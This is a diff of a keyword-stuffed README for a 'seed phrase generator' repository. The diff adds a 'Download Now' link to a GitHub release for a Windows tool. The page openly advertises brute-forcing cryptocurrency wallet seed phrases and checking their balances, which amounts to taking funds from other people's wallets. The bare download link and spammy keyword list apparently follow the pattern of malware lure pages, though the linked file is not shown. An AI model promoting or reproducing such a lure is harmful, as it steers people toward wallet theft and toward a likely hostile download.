@@ -1,6 +1,8 @@
 # Seed-Gen-Latest-2024
 seed-generator seed-phrase-generator seed-phrase-checker seed-phrase-bruteforce seed-phrase-generator-download seed-phrase-generator-2024 seed-phrase-generator-and-balance-checker seed-phrase mnemonic-generator mnemonic-phrase-recovery
 
+# [Download Now](https://github.com/Jonastdm/Software/releases/tag/download)
+
 <div id="badges">
   <img src="https://img.shields.io/badge/Windows-blue?logo=Windows&logoColor=white&style=for-the-badge" alt="Windows Badge"/>
   <img src="https://img.shields.io/badge/License-dark?logo=License&logoColor=white&style=for-the-badge" alt="License Badge"/>
